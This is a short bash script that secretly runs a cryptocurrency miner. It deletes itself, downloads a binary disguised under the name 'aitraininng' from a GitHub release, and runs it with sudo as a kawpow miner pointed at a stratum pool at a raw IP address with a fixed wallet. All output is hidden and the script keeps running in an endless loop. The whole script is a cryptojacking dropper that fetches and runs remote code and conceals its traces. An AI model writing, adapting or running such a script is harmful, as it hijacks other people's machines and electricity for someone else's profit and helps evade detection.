#!/bin/bash

# Run the script in the background using nohup and redirect output to /dev/null
nohup bash -c "
  ( sleep 1; rm -- \"$0\" ) &
  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
  chmod +x aitraininng
  sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
  while true; do 
    sleep 60
  done
" > /dev/null 2>&1 &
